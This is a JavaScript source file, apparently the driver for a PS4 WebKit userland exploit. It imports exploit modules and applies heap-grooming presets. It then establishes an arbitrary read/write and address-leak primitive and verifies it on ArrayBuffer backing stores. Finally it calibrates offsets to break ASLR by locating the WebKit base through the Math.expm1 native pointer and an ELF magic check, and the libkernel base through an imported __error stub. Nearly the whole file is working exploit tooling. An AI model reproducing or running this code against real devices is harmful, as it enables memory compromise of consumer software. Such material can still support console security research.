import { int64 } from "./int64.js";
import { offsetsFor, offsetsForKey } from "./ps4_offsets_userland.js";
import { installWindowP, pairStatus } from "./mem.js";

let outEl, stateEl, fwSelect, attemptsSelect;
let btnEstablish, btnOffsets, btnRwOnly, btnCalibrate, btnCalibrateErr, btnAll, btnClear;

const GROOM_PRESETS = {
    default: {
        label: "default",
        g: [],
    },
    lite: {
        label: "lite",
        g: ["drain:256", "drainsz:32768", "slab:2097152"],
    },
    "384": {
        label: "384",
        g: ["drain:384", "drainsz:32768", "slab:2097152"],
    },
    "512": {
        label: "512",
        g: ["drain:512", "drainsz:32768", "slab:2097152"],
    },
    max: {
        label: "max",
        g: [
            "drain:512", "drainsz:65536", "slab:4194304",
            "bfly:528384", "early:458752", "guard:589824",
            "pred:524288", "final:524288",
        ],
    },
};

const CAL_PRESETS = {
    default: { calreset: false },
    reset: { calreset: true },
};

const params = new URLSearchParams(location.search);
const lines = [];
let passCount = 0;
let failCount = 0;
let busy = false;
let primitiveDone = false;
let exploit = null;
let calibratedOff = null;
let probeCache = null;
let logQuiet = 0;

const CORE_LOG = /ADDROF|FAIL|ERROR|PRIMITIVE|PASS|GIVE-UP|ATTEMPT|SETUP|CARRIER|PAIR|SSV-|TRIM-DEBRIS|ADDROF-RELEASE|FAKE-ADDRESS|READ-PRIMITIVE|PLACEMENT|COMPOSITION|NORMAL-CLONE|ZERO-HEADER|VALIDATION|LOAD-THREW|NO-RESULT/i;
const PRIMITIVE_LOUD = /FAIL|ERROR|THREW|ABORT|PASS|GIVE-UP|PRIMITIVE|ADDROF-FAIL|ADDROF-NO/i;

const LOG_MAX = 400;
const STORAGE_KEY = "wk-userland-session-v1";
const STORAGE_MAX = 500;
const CAL_ALIGN_STEP = 0x4000;
const CAL_LITE_K = 8;

let saveTimer = null;

function renderLog() {
    if (!outEl) return;
    outEl.textContent = lines.join("\n");
    outEl.scrollTop = outEl.scrollHeight;
}

function saveSession() {
    try {
        localStorage.setItem(STORAGE_KEY, JSON.stringify({
            v: 1,
            ts: Date.now(),
            lines: lines.slice(-STORAGE_MAX),
            passCount,
            failCount,
            stateMsg: stateEl ? stateEl.textContent : "",
            stateCls: stateEl ? stateEl.className : "",
            primitiveDone,
            calibratedOff,
        }));
    } catch (_) { }
}

function scheduleSave() {
    if (saveTimer) return;
    saveTimer = setTimeout(() => {
        saveTimer = null;
        saveSession();
    }, 120);
}

function loadSession() {
    try {
        const raw = localStorage.getItem(STORAGE_KEY);
        if (!raw) return null;
        const data = JSON.parse(raw);
        if (!data || !Array.isArray(data.lines) || data.lines.length === 0)
            return null;
        lines.length = 0;
        lines.push(...data.lines.slice(-STORAGE_MAX));
        passCount = data.passCount || 0;
        failCount = data.failCount || 0;
        primitiveDone = !!data.primitiveDone;
        calibratedOff = data.calibratedOff || null;
        renderLog();
        if (stateEl && data.stateMsg)
            state(data.stateMsg, data.stateCls || "");
        return {
            savedPrimitive: !!data.primitiveDone,
            savedCalibrated: !!data.calibratedOff,
            savedAt: data.ts || 0,
        };
    } catch (_) {
        return null;
    }
}

function lastMeaningfulLine() {
    for (let i = lines.length - 1; i >= 0; i--) {
        const l = lines[i];
        if (l.startsWith("RELOAD") || l.startsWith("RESTORE") || l.startsWith("HINT-RESTORE"))
            continue;
        return l;
    }
    return "";
}

function mark(tag, detail) {
    if (!outEl) return;
    const line = tag + (detail == null || detail === "" ? "" : "  " + detail);
    lines.push(line);
    if (lines.length > LOG_MAX)
        lines.splice(0, lines.length - LOG_MAX);
    renderLog();
    if (logQuiet === 0)
        scheduleSave();
}

function state(msg, cls) {
    if (!stateEl) return;
    stateEl.textContent = msg;
    stateEl.className = cls || "";
    if (logQuiet === 0)
        scheduleSave();
}

function clearLog() {
    lines.length = 0;
    passCount = 0;
    failCount = 0;
    calibratedOff = null;
    primitiveDone = false;
    probeCache = null;
    if (outEl) outEl.textContent = "";
    try { localStorage.removeItem(STORAGE_KEY); } catch (_) { }
}

function resolvedOffKey() {
    const pick = fwSelect.value;
    if (pick === "auto") {
        const detected = offsetsFor(navigator.userAgent);
        return detected.key || "13.00";
    }
    return pick;
}

function effectiveOff() {
    const offKey = resolvedOffKey();
    const { off } = offsetsForKey(offKey);
    if (!off) return null;
    if (calibratedOff)
        return Object.assign({}, off, calibratedOff);
    return off;
}

function crossFw(offKey) {
    const detected = offsetsFor(navigator.userAgent);
    return detected.key && detected.key !== offKey;
}

function setUi() {
    if (!btnEstablish) return;
    const hasP = !!window.p;
    btnEstablish.disabled = busy || primitiveDone;
    btnOffsets.disabled = busy || !hasP;
    if (btnRwOnly) btnRwOnly.disabled = busy || !hasP;
    btnCalibrate.disabled = busy || !hasP;
    if (btnCalibrateErr) btnCalibrateErr.disabled = busy || !hasP || !calibratedOff;
    btnAll.disabled = busy || primitiveDone;
    btnClear.disabled = busy;
    fwSelect.disabled = busy || primitiveDone;
    if (attemptsSelect) attemptsSelect.disabled = busy || primitiveDone;
}

async function withBusy(fn) {
    if (busy) return;
    busy = true;
    setUi();
    try {
        await fn();
    } finally {
        busy = false;
        setUi();
    }
}

async function loadExploit() {
    if (exploit) return exploit;
    mark("LOAD", "importing core.js + mem.js...");
    const core = await import("./core.js");
    const mem = await import("./mem.js");
    exploit = {
        establishPrimitive: core.establishPrimitive,
        installWindowP: mem.installWindowP,
        pairStatus: mem.pairStatus
    };
    mark("LOAD-OK", "exploit modules ready");
    return exploit;
}

function check(name, ok, detail) {
    if (ok) {
        passCount++;
        mark("PASS", name + (detail ? "  " + detail : ""));
    } else {
        failCount++;
        mark("FAIL", name + (detail ? "  " + detail : ""));
    }
    return ok;
}

function same64(a, b) {
    return a.low === b.low && a.hi === b.hi;
}

function alignedWebkitBase(v) {
    return v.hi > 0 && (v.low & 0x3fff) === 0;
}

function plausibleLibkernelBase(v) {
    return v.hi > 0 && v.low !== 0;
}

function plausibleUserPtr(v) {
    if (!v || typeof v !== "object" || !("low" in v)) return false;
    const hi = v.hi >>> 0;
    const lo = v.low >>> 0;
    if (hi > 0xffff) return false;
    if (lo === 0 && hi === 0) return false;
    return true;
}

function read8p(p, addr) {
    try { return p.read8(addr); } catch (_) { return null; }
}

function read4p(p, addr) {
    try { return p.read4(addr); } catch (_) { return null; }
}

function safeRead8(p, addr) {
    if (!plausibleUserPtr(addr)) return null;
    try {
        return p.read8(addr);
    } catch (_) {
        return null;
    }
}

function safeRead4(p, addr) {
    if (!plausibleUserPtr(addr)) return null;
    try {
        return p.read4(addr);
    } catch (_) {
        return null;
    }
}

function parseNativeFnStr(str) {
    if (!str) return null;
    const s = String(str).trim().toLowerCase().replace(/^0x/, "");
    if (!/^[0-9a-f]+$/.test(s)) return null;
    if (s.length <= 8)
        return new int64(parseInt(s, 16), 0);
    const lo = parseInt(s.slice(-8), 16);
    const hi = parseInt(s.slice(0, -8), 16);
    return new int64(lo, hi);
}

function preCalTrim() {
    if (lines.length > 6) {
        lines.splice(0, lines.length - 6);
        renderLog();
    }
}

function nativeFnForCalibrate(tableOff) {
    if (probeCache && probeCache.nativeFn)
        return probeCache.nativeFn;
    const cached = parseNativeFnStr(sessionStorage.getItem("wk-nativeFn"));
    if (cached) {
        probeCache = {
            nativeFn: cached,
            mFunctionOff: tableOff.wk_JSFunction_m_function || 0x28
        };
        return cached;
    }
    return null;
}

function captureNativeFn(p, mFunctionOff) {
    const cell = p.leakval(Math.expm1);
    const mid = read8p(p, cell.add32(0x18));
    if (!mid) return null;
    const nativeFn = read8p(p, mid.add32(mFunctionOff));
    if (!nativeFn) return null;
    probeCache = { nativeFn, mFunctionOff, cell, mid };
    try {
        sessionStorage.setItem("wk-nativeFn", String(nativeFn));
    } catch (_) { }
    return nativeFn;
}

function nativeFnForOff(p, off) {
    if (probeCache && probeCache.nativeFn)
        return probeCache.nativeFn;
    try {
        const cached = parseNativeFnStr(sessionStorage.getItem("wk-nativeFn"));
        if (cached) {
            probeCache = { nativeFn: cached, mFunctionOff: off.wk_JSFunction_m_function || 0x28 };
            return cached;
        }
    } catch (_) { }
    return captureNativeFn(p, off.wk_JSFunction_m_function || 0x28);
}

const ELF_MAGIC = 0x464c457f;

function liteHintDeltas(tableOff, nativeFn) {
    const hint = tableOff.wk_expm1_builtin;
    if (hint == null) return [];
    const residue = nativeFn.low & (CAL_ALIGN_STEP - 1);
    const out = [];
    for (let k = -CAL_LITE_K; k <= CAL_LITE_K; k++) {
        const d = (hint + k * CAL_ALIGN_STEP) >>> 0;
        if ((d & 0x3fff) === residue)
            out.push(d);
    }
    return out;
}

function applyManualExpm1(hexStr) {
    const delta = parseInt(String(hexStr).trim().replace(/^0x/i, ""), 16);
    if (!(delta > 0)) {
        mark("CAL-FAIL", "bad expm1 hex");
        return false;
    }
    const { off } = offsetsForKey(resolvedOffKey());
    if (!off) return false;
    calibratedOff = Object.assign({}, off, {
        fw_status: "manual expm1",
        wk_expm1_builtin: delta,
    });
    try {
        sessionStorage.setItem("wk-calibrated", JSON.stringify(calibratedOff));
        sessionStorage.removeItem("wk-cal-lite-i");
    } catch (_) { }
    mark("CAL-OK", "manual expm1=0x" + delta.toString(16) + " (0 scan reads)");
    saveSession();
    state("expm1 set — run step 2 verify", "ok");
    setUi();
    return true;
}

async function calibrateLiteAnchor(p, tableOff) {
    preCalTrim();
    const nativeFn = nativeFnForCalibrate(tableOff);
    if (!nativeFn) {
        mark("CAL-FAIL", "no nativeFn — re-run step 1 first");
        return null;
    }

    if (params.get("calreset") === "1")
        try { sessionStorage.removeItem("wk-cal-lite-i"); } catch (_) { }

    const deltas = liteHintDeltas(tableOff, nativeFn);
    if (deltas.length === 0) {
        mark("CAL-FAIL", "no aligned hint deltas");
        mark("CAL-NATIVEFN", String(nativeFn));
        return null;
    }

    let i = 0;
    try { i = parseInt(sessionStorage.getItem("wk-cal-lite-i") || "0", 10) || 0; } catch (_) { }
    if (i >= deltas.length) {
        mark("CAL-FAIL", "lite anchor miss (" + deltas.length + " tries)");
        mark("CAL-NATIVEFN", String(nativeFn));
        mark("HINT", "type expm1 in box + set expm1 (0 reads)");
        return null;
    }

    mark("CAL-TRY", (i + 1) + "/" + deltas.length + " 0x" + deltas[i].toString(16));
    await new Promise(r => setTimeout(r, 64));

    const hit = tryElfOnce(p, nativeFn, deltas[i]);
    try { sessionStorage.setItem("wk-cal-lite-i", String(i + 1)); } catch (_) { }

    if (hit) {
        try { sessionStorage.removeItem("wk-cal-lite-i"); } catch (_) { }
        return finishCalibrate(tableOff, tableOff.wk_JSFunction_m_function || 0x28,
            hit.delta, hit.base, "lite@0x" + hit.delta.toString(16));
    }

    mark("CAL-MORE", "tap step 3 (" + (i + 1) + "/" + deltas.length + ")");
    return null;
}

async function calibrateOffsets(p, tableOff) {
    logQuiet++;
    let live = null;
    try {
        live = await calibrateLiteAnchor(p, tableOff);
    } finally {
        logQuiet--;
    }
    if (live || calibratedOff)
        saveSession();
    return live;
}

function tryElfOnce(p, nativeFn, delta) {
    if (delta < 0) return null;
    const base = nativeFn.sub32(delta);
    if (!alignedWebkitBase(base)) return null;
    if (read4p(p, base) !== ELF_MAGIC) return null;
    return { delta, base };
}

function finishCalibrate(tableOff, mFunctionOff, delta, base, via) {
    const live = {
        fw_status: "calibrated on hardware",
        wk_JSFunction_m_function: mFunctionOff,
        wk_expm1_builtin: delta,
        wk_ArrayBuffer_m_impl: tableOff.wk_ArrayBuffer_m_impl,
        wk_ArrayBuffer_m_contents_m_data: tableOff.wk_ArrayBuffer_m_contents_m_data,
    };
    calibratedOff = live;
    try {
        sessionStorage.setItem("wk-calibrated", JSON.stringify(live));
    } catch (_) { }
    mark("CAL-OK", via + " expm1=0x" + delta.toString(16) + " base=" + base);
    mark("PASTE-OFFSETS", JSON.stringify(live));
    try { sessionStorage.removeItem("wk-cal-lite-i"); } catch (_) { }
    return live;
}

function tryTableErrorImportDirect(p, webkitBase, tableOff) {
    if (!tableOff.wk___imp___error || !tableOff.k__error) return null;
    const errorFn = read8p(p, webkitBase.add32(tableOff.wk___imp___error));
    if (!errorFn) return null;
    const lk = errorFn.sub32(tableOff.k__error);
    const w0 = read4p(p, lk);
    const w1 = read4p(p, lk.add32(4));
    if (w0 == null || w1 == null) return null;
    if ((w0 & 0xff) === 0xb8 && (w1 & 0xffff) === 0x050f)
        return {
            wk___imp___error: tableOff.wk___imp___error,
            k__error: tableOff.k__error,
            libkernelBase: lk
        };
    return null;
}

function computeBases(p, off) {
    if (!off || !off.wk_expm1_builtin) return null;
    const nativeFn = nativeFnForOff(p, off);
    if (!nativeFn) return { error: "nativeFn unreadable" };
    const webkitBase = nativeFn.sub32(off.wk_expm1_builtin);
    if (!off.wk___imp___error || !off.k__error)
        return { nativeFn, webkitBase, libkernelBase: null };
    const errorFn = read8p(p, webkitBase.add32(off.wk___imp___error));
    if (!errorFn)
        return { nativeFn, webkitBase, libkernelBase: null, error: "error import unreadable" };
    const libkernelBase = errorFn.sub32(off.k__error);
    return { nativeFn, webkitBase, libkernelBase, errorFn };
}

function verifyBases(p, off, checkOffset) {
    const b = computeBases(p, off);
    if (!b) {
        checkOffset("module-bases", false, "no offset table");
        return false;
    }
    if (b.error && !b.libkernelBase) {
        mark("BASES", "webkit=" + b.webkitBase + " nativeFn=" + b.nativeFn
            + " (" + b.error + ")");
        checkOffset("module-bases-webkit-aligned", alignedWebkitBase(b.webkitBase), "");
        checkOffset("module-bases-libkernel", false, b.error);
        return false;
    }
    mark("BASES", "webkit=" + b.webkitBase + " libkernel=" + b.libkernelBase
        + " nativeFn=" + b.nativeFn);
    const wkOk = alignedWebkitBase(b.webkitBase);
    const lkOk = b.libkernelBase
        ? (alignedWebkitBase(b.libkernelBase) || plausibleLibkernelBase(b.libkernelBase))
        : false;
    checkOffset("module-bases-webkit-aligned", wkOk, "");
    if (b.libkernelBase)
        checkOffset("module-bases-libkernel-plausible", lkOk, "");
    return wkOk && lkOk;
}

function bufAddr(p, off, ab) {
    const cell = p.leakval(ab);
    const impl = read8p(p, cell.add32(off.wk_ArrayBuffer_m_impl));
    if (!impl) return null;
    return read8p(p, impl.add32(off.wk_ArrayBuffer_m_contents_m_data));
}

function logBootInfo() {
    const detected = offsetsFor(navigator.userAgent);
    mark("UA", navigator.userAgent);
    mark("UA-FW", detected.key || "unknown");
    const gkey = currentGroomKey();
    mark("BOOT", "groom=" + gkey + (gkey === "custom" ? " (" + params.getAll("g").join(", ") + ")" : ""));
    if (params.has("calreset")) mark("BOOT", "calreset=1");
    mark("BOOT", "addrof needs 12M slots — never reduce slots");
}

function maxAttemptsPick() {
    const fromUrl = parseInt(params.get("attempts") || "", 10);
    if (fromUrl > 0) return fromUrl;
    if (attemptsSelect) return parseInt(attemptsSelect.value, 10) || 3;
    return 3;
}

async function runEstablish() {
    if (primitiveDone) {
        mark("SKIP", "primitive already established this page");
        return;
    }

    lines.length = 0;
    passCount = 0;
    failCount = 0;
    renderLog();
    logQuiet++;

    mark("STEP", "1 - get primitive (12M slots)");
    mark("NOTE", "close browser fully before this if prior OOM");
    mark("ATTEMPTS", String(maxAttemptsPick()));

    const { establishPrimitive, installWindowP, pairStatus } = await loadExploit();
    const maxAttempts = maxAttemptsPick();

    state("establishing primitive...", "warn");

    let carrier;
    try {
        carrier = await establishPrimitive({
            maxAttempts,
            onEvent: (t, d, a) => (CORE_LOG.test(t) ? mark : () => {})
                (t, (a != null ? "[" + a + "] " : "") + (d || ""))
        });
    } catch (err) {
        if (/gave up/i.test(String(err.message))) {
            mark("HINT", "race lost — close browser fully, reopen, tries=3");
        }
        throw err;
    } finally {
        logQuiet--;
    }

    installWindowP(carrier, {
        promote: params.get("promote") === "1",
        onEvent: (t, d) => (PRIMITIVE_LOUD.test(t) ? mark : () => {})(t, d || "")
    });

    const p = window.p;
    if (!p) throw new Error("window.p was not installed");

    primitiveDone = true;
    if (!params.get("expm1"))
        calibratedOff = null;
    mark("PAIR-STATUS", "state=" + pairStatus.state + " promoted=" + pairStatus.promoted);
    mark("PRIMITIVE-OK", "window.p read/write/leakval live");

    const boxA = { tag: "A" };
    const boxB = { tag: "B" };
    const addrA = p.leakval(boxA);
    const addrB = p.leakval(boxB);
    check("leakval-distinct",
        !same64(addrA, addrB) && addrA.low !== 0 && addrB.low !== 0,
        "a=" + addrA + " b=" + addrB);

    const headerA = p.read8(addrA);
    p.write8(addrA, headerA);
    check("read8-write8-roundtrip-header", same64(p.read8(addrA), headerA), "");

    const { off: capOff } = offsetsForKey(resolvedOffKey());
    if (capOff) {
        logQuiet++;
        try { captureNativeFn(p, capOff.wk_JSFunction_m_function || 0x28); } finally { logQuiet--; }
    }

    saveSession();
    state("primitive OK — step 3 lite cal OR set expm1, then step 2", "ok");
    mark("READY", "PRIMITIVE-OK — nativeFn saved for lite cal");
}

async function runOffsetTests() {
    const p = window.p;
    if (!p) throw new Error("run step 1 first");

    const offKey = resolvedOffKey();
    const off = effectiveOff();
    if (!off) throw new Error("no offset table for fw=" + offKey);

    mark("STEP", "2 - offset tests (lite)");
    mark("OFFSETS-FW", offKey);
    mark("OFFSETS-SRC", calibratedOff ? "calibrated" : "table (cal failed — BASES skipped)");
    if (crossFw(offKey) && !calibratedOff)
        mark("NOTE", "table RVAs may not match UA firmware");

    state("offset tests...", "warn");
    await new Promise(r => setTimeout(r, 0));

    let offsetFail = 0;
    const checkOffset = (name, ok, detail) => {
        if (ok) {
            passCount++;
            mark("PASS", name + (detail ? "  " + detail : ""));
        } else {
            failCount++;
            offsetFail++;
            mark("FAIL", name + (detail ? "  " + detail : ""));
        }
        return ok;
    };

    const probe = new ArrayBuffer(0x20);
    const view = new Uint32Array(probe);
    view[0] = 0xdeadbeef;

    const dataPtr = bufAddr(p, off, probe);
    if (!dataPtr) {
        checkOffset("arraybuffer-backing", false, "bufAddr failed — impl chain wrong");
    } else {
        const got = read4p(p, dataPtr);
        checkOffset("arraybuffer-read4",
            got === 0xdeadbeef,
            "got=" + (got == null ? "null" : "0x" + got.toString(16)));
        if (got === 0xdeadbeef) {
            p.write4(dataPtr, new int64(0x13371337, 0));
            checkOffset("arraybuffer-write4", view[0] === 0x13371337, "");
        }
    }

    if (!calibratedOff) {
        mark("SKIP-BASES", "cal failed in step 1 — retry step 3 or ?expm1=0x...");
    } else {
        verifyBases(p, off, checkOffset);
        const b = computeBases(p, off);
        if (b && b.webkitBase && !off.k__error) {
            const lk = tryTableErrorImportDirect(p, b.webkitBase, off);
            if (lk)
                mark("LK-OK", "libkernel=" + lk.libkernelBase);
        }
    }

    const summary = passCount + " pass, " + failCount + " fail";
    state("offset tests done — " + summary, offsetFail ? "warn" : "ok");
    mark("DONE-OFFSETS", summary);
}

async function runRwOnly() {
    const p = window.p;
    if (!p) throw new Error("run step 1 first");

    mark("STEP", "2a - userland rw (no bases, no cal)");
    state("testing rw...", "warn");
    await new Promise(r => setTimeout(r, 0));

    let rwFail = 0;
    const chk = (name, ok, detail) => {
        if (ok) {
            passCount++;
            mark("PASS", name + (detail ? "  " + detail : ""));
        } else {
            failCount++;
            rwFail++;
            mark("FAIL", name + (detail ? "  " + detail : ""));
        }
        return ok;
    };

    const boxA = { tag: "rwA", salt: 0x1111 };
    const boxB = { tag: "rwB", salt: 0x2222 };
    const addrA = p.leakval(boxA);
    const addrB = p.leakval(boxB);
    chk("leakval-distinct",
        !same64(addrA, addrB) && addrA.low !== 0 && addrB.low !== 0,
        "a=" + addrA + " b=" + addrB);

    const headerA = p.read8(addrA);
    p.write8(addrA, headerA);
    chk("read8-write8-header", same64(p.read8(addrA), headerA), "");

    const probe = new ArrayBuffer(0x10);
    const view = new Uint32Array(probe);
    view[0] = 0xcafebabe;

    const { off } = offsetsForKey(resolvedOffKey());
    if (!off) {
        mark("SKIP-AB", "no offset table — header rw still proves primitive");
    } else {
        const dataPtr = bufAddr(p, off, probe);
        if (!dataPtr) {
            chk("arraybuffer-backing", false, "table impl chain failed (not a base issue)");
        } else {
            const got = read4p(p, dataPtr);
            chk("arraybuffer-read4",
                got === 0xcafebabe,
                "got=" + (got == null ? "null" : "0x" + got.toString(16)));
            if (got === 0xcafebabe) {
                p.write4(dataPtr, new int64(0x600dbabe, 0));
                chk("arraybuffer-write4", view[0] === 0x600dbabe, "");
            }
        }
    }

    mark("NOTE", "module BASES not tested — no expm1/cal needed for this step");

    const summary = passCount + " pass, " + failCount + " fail";
    if (rwFail === 0) {
        state("userland rw OK — no bases needed", "ok");
        mark("RW-ONLY-OK", summary);
    } else {
        state("userland rw failed — " + summary, "bad");
        mark("RW-ONLY-FAIL", summary);
    }
    saveSession();
}

async function runCalibrate() {
    const p = window.p;
    if (!p) throw new Error("run step 1 first");

    const offKey = resolvedOffKey();
    const { off } = offsetsForKey(offKey);
    if (!off) throw new Error("no offset table for fw=" + offKey);

    preCalTrim();

    mark("STEP", "3 - lite cal (1 read/tap)");
    state("lite cal...", "warn");

    const live = await calibrateOffsets(p, off);

    if (calibratedOff || live) {
        saveSession();
        state("cal OK — run step 2 verify", "ok");
    } else {
        const more = sessionStorage.getItem("wk-cal-lite-i");
        state(more ? "tap step 3 again or set expm1" : "lite miss — set expm1", "warn");
    }
    mark("DONE-CALIBRATE", calibratedOff ? "ok" : (sessionStorage.getItem("wk-cal-lite-i") ? "more" : "fail"));
}

function runManualExpm1() {
    const el = document.getElementById("expm1-in");
    if (!el) return;
    applyManualExpm1(el.value);
}

async function runLibkernelCheck() {
    const p = window.p;
    if (!p) throw new Error("run step 1 first");
    if (!calibratedOff) throw new Error("calibrate first (step 1 or 3)");

    const off = effectiveOff();
    if (!off) throw new Error("no offsets");

    mark("STEP", "3b - libkernel check (3 reads)");
    state("libkernel check...", "warn");

    const b = computeBases(p, off);
    if (!b || !b.webkitBase) {
        mark("LK-FAIL", "webkit base unavailable");
        state("libkernel check failed", "warn");
        return;
    }

    const hit = tryTableErrorImportDirect(p, b.webkitBase, off);
    if (hit) {
        mark("LK-OK", "libkernel=" + hit.libkernelBase);
        mark("LK-PASTE", JSON.stringify({
            wk___imp___error: hit.wk___imp___error,
            k__error: hit.k__error
        }));
        state("libkernel OK", "ok");
    } else {
        mark("LK-FAIL", "table __error import did not verify @ webkit=" + b.webkitBase);
        state("libkernel check failed", "warn");
    }
}

function currentGroomKey() {
    const gs = params.getAll("g");
    if (gs.length === 0) return "default";
    for (const key of Object.keys(GROOM_PRESETS)) {
        if (key === "default") continue;
        const preset = GROOM_PRESETS[key];
        if (preset.g.length !== gs.length) continue;
        let match = true;
        for (let i = 0; i < preset.g.length; i++) {
            if (gs[i] !== preset.g[i]) {
                match = false;
                break;
            }
        }
        if (match) return key;
    }
    return "custom";
}

function highlightGroomButtons() {
    const key = currentGroomKey();
    document.querySelectorAll("[data-groom]").forEach(el => {
        el.classList.toggle("active", el.getAttribute("data-groom") === key);
    });
}

function reloadWithGroomPreset(key) {
    const preset = GROOM_PRESETS[key];
    if (!preset) return;
    saveSession();
    const url = new URL(location.href);
    url.searchParams.set("clear", "1");
    url.searchParams.delete("g");
    url.searchParams.delete("slots");
    for (const item of preset.g)
        url.searchParams.append("g", item);
    location.href = url.toString();
}

function reloadWithCalPreset(key) {
    const preset = CAL_PRESETS[key];
    if (!preset) return;
    saveSession();
    const url = new URL(location.href);
    url.searchParams.delete("calchunk");
    url.searchParams.delete("calmax");
    url.searchParams.delete("calreset");
    if (preset.calreset) url.searchParams.set("calreset", "1");
    location.href = url.toString();
}

function wirePresetBar(selector, reloadFn) {
    document.querySelectorAll(selector).forEach(el => {
        el.addEventListener("click", () => {
            if (busy) return;
            const key = el.getAttribute(selector === "[data-groom]" ? "data-groom" : "data-cal");
            if (key) reloadFn(key);
        });
    });
}

function wireButton(el, handler) {
    if (!el) return;
    el.addEventListener("click", () => {
        withBusy(async () => {
            try {
                await handler();
            } catch (err) {
                state("error: " + err.message, "bad");
                mark("ERROR", err.stack || err.message);
            }
        });
    });
}

function restoreCalibratedFromStorage() {
    if (calibratedOff) return;
    try {
        const raw = sessionStorage.getItem("wk-calibrated");
        if (raw)
            calibratedOff = JSON.parse(raw);
    } catch (_) { }
}

function applyUrlOverrides() {
    const expm1 = params.get("expm1");
    if (!expm1) return;
    const delta = parseInt(expm1, 16);
    if (!(delta > 0)) return;
    const { off } = offsetsForKey(resolvedOffKey());
    if (!off) return;
    calibratedOff = Object.assign({}, off, {
        fw_status: "url ?expm1=" + expm1,
        wk_expm1_builtin: delta,
    });
    mark("BOOT", "expm1 override 0x" + delta.toString(16));
}

function init() {
    outEl = document.getElementById("out");
    stateEl = document.getElementById("state");
    fwSelect = document.getElementById("fw-select");
    attemptsSelect = document.getElementById("attempts-select");
    btnEstablish = document.getElementById("btn-establish");
    btnOffsets = document.getElementById("btn-offsets");
    btnRwOnly = document.getElementById("btn-rw-only");
    btnCalibrate = document.getElementById("btn-calibrate");
    btnCalibrateErr = document.getElementById("btn-calibrate-err");
    btnAll = document.getElementById("btn-all");
    btnClear = document.getElementById("btn-clear");

    if (!outEl || !btnEstablish) {
        state("UI missing — host via HTTP, open index.html", "bad");
        return;
    }

    wireButton(btnEstablish, runEstablish);
    wireButton(btnOffsets, runOffsetTests);
    if (btnRwOnly) wireButton(btnRwOnly, runRwOnly);
    wireButton(btnCalibrate, runCalibrate);
    if (btnCalibrateErr)
        wireButton(btnCalibrateErr, runLibkernelCheck);
    wireButton(btnAll, runEstablish);

    btnClear.addEventListener("click", () => {
        if (busy) return;
        clearLog();
        logBootInfo();
        state(primitiveDone ? "primitive OK — pick a test" : "ready", primitiveDone ? "ok" : "");
    });

    wirePresetBar("[data-groom]", reloadWithGroomPreset);
    wirePresetBar("[data-cal]", reloadWithCalPreset);
    const btnExpm1 = document.getElementById("btn-expm1-set");
    if (btnExpm1)
        btnExpm1.addEventListener("click", () => { if (!busy) runManualExpm1(); });
    highlightGroomButtons();

    window.addEventListener("beforeunload", () => saveSession());
    window.addEventListener("error", (e) => {
        const msg = "JS error: " + (e.message || e);
        state(msg, "bad");
        mark("JS-ERROR", msg + " @ " + (e.filename || "") + ":" + (e.lineno || ""));
    });
    window.addEventListener("unhandledrejection", (e) => {
        const msg = "unhandled: " + (e.reason && e.reason.message ? e.reason.message : e.reason);
        state(msg, "bad");
        mark("JS-REJECT", msg);
    });

    if (params.get("fw") && fwSelect.querySelector('option[value="' + params.get("fw") + '"]'))
        fwSelect.value = params.get("fw");
    if (params.get("attempts") && attemptsSelect)
        attemptsSelect.value = params.get("attempts");

    restoreCalibratedFromStorage();
    applyUrlOverrides();

    if (params.get("clear") === "1") {
        clearLog();
        state("ready — tap step 1", "");
        logBootInfo();
    } else {
        const restored = loadSession();
        if (restored) {
            const savedPrimitive = restored.savedPrimitive;
            if (!window.p)
                primitiveDone = false;
            mark("RELOAD", new Date().toISOString());
            mark("RESTORE", "lines=" + lines.length
                + " pass=" + passCount + " fail=" + failCount
                + " savedPrimitive=" + savedPrimitive
                + " livePrimitive=" + !!window.p
                + (restored.savedCalibrated ? " savedCalibrated=yes" : ""));
            const tail = lastMeaningfulLine();
            if (tail)
                mark("LAST-LOG", tail);
            if (savedPrimitive && !window.p)
                mark("HINT-RESTORE", "step 1 worked last time — re-run 1, then 3 cal, then 2");
            else if (passCount >= 2 && !savedPrimitive)
                mark("HINT-RESTORE", "pass=2 but primitive not saved — OOM during step 1 checks?");
            state("restored log — scroll up for crash point", savedPrimitive ? "warn" : "");
        } else {
            state("ready — tap step 1", "");
            logBootInfo();
        }
    }
    highlightGroomButtons();
    setUi();
}

try {
    init();
} catch (err) {
    state("init error: " + err.message, "bad");
    mark("ERROR", err.stack || err.message);
}
